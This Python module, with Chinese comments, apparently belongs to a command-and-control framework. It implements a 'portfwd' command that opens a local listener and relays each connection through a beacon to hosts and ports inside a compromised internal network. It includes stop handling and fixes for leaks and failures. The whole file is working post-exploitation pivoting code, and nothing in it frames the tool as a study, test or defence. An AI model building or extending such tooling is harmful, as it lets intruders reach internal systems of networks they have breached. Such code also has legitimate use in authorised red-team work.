"""portfwd — 端口转发（14）: 把目标内网端口映射到 server 本地
portfwd <beacon_id> <listen_port> <target_host> <target_port>
portfwd stop   停止当前端口转发
"""

import socket
import threading


def _stop_portfwd(disp):
    """停止当前转发：置 stopped 标志 + 关监听 socket。

    重复调用 portfwd 前也会先走这里，避免旧监听线程/socket 泄漏（#6）。
    """
    stopped = getattr(disp, "_portfwd_stopped", None)
    if stopped is not None:
        stopped["v"] = True
    sock = getattr(disp, "_portfwd_sock", None)
    if sock is not None:
        try:
            sock.close()
        except OSError:
            pass
        disp._portfwd_sock = None
    thread = getattr(disp, "_portfwd_thread", None)
    if thread is not None and thread.is_alive():
        thread.join(timeout=2)   # close 不打断 accept，等超时(1s)后线程退出、端口释放
    return "[+] 端口转发已停止"


def run(disp, args):
    if args and args[0] == "stop":
        return _stop_portfwd(disp)
    if len(args) < 4:
        return "[!] usage: portfwd <beacon_id> <listen_port> " \
               "<target_host> <target_port>  （或 portfwd stop）"
    bid, lport_s, thost, tport_s = args[0], args[1], args[2], args[3]
    try:
        lport = int(lport_s)
        tport = int(tport_s)
    except ValueError:
        return "[!] 端口必须是数字"
    hub = getattr(disp, "hub", None)
    if hub is None:
        return "[!] 中继未启用（config relay_port 需 >0）"

    _stop_portfwd(disp)   # 重复调用：先停旧的（#6 泄漏修复）

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("127.0.0.1", lport))
        s.listen(8)
        s.settimeout(1.0)
    except OSError as e:
        return f"[!] 监听失败: {e}"

    stopped = {"v": False}

    def _loop():
        while not stopped["v"]:
            try:
                conn, _ = s.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                hub.open_channel(bid, conn, thost, tport)
            except ValueError as e:
                # 单次失败（队列满/构建失败）只关本次连接，监听继续；
                # 此前 return 会退出整个 accept 循环，转发器永久失效
                conn.close()
                continue

    t = threading.Thread(target=_loop, daemon=True)
    t.start()
    disp._portfwd_stopped = stopped
    disp._portfwd_sock = s
    disp._portfwd_thread = t

    return (f"[+] 端口转发: 127.0.0.1:{lport} → {bid}:{thost}:{tport}\n"
            f"    每个连接经 beacon 中继（延迟 ≈ beacon 轮询周期）\n"
            f"    停止: portfwd stop")
